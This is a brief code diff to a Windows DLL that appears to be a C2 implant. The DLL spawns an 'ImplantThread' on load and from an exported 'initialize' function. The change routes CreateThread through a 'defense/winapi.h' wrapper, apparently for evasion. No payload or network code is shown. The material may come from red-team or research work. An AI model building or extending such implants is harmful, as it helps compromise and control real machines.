@@ -1,7 +1,7 @@
 #include <windows.h>
 #include "core/c2.h"
 #include "_debug/debug.h"
-
+#include "defense/winapi.h"
 DWORD WINAPI ImplantThread(LPVOID)
 {
     DEBUG_LOG("[ImplantThread] Thread started. Initializing C2Implant...");
@@ -27,7 +27,7 @@ DWORD WINAPI ImplantThread(LPVOID)
 // have to do extern c cuz otherwise C++ mangles it
 extern "C" __declspec(dllexport) void __cdecl initialize() {
     DEBUG_LOG("[DLL Export::initialize] Exported function 'initialize' called. Spawning ImplantThread...");
-    CreateThread(nullptr, 0, ImplantThread, nullptr, 0, nullptr);
+    WinApi::CreateThread(nullptr, 0, ImplantThread, nullptr, 0, nullptr);
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule,
@@ -38,7 +38,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
     {
     case DLL_PROCESS_ATTACH:
         DEBUG_LOG("[DllMain::DLL_PROCESS_ATTACH] DLL loaded into process. Spawning ImplantThread...");
-        CreateThread(nullptr, 0, ImplantThread, nullptr, 0, nullptr);
+        WinApi::CreateThread(nullptr, 0, ImplantThread, nullptr, 0, nullptr);
         break;
     
     case DLL_PROCESS_DETACH:
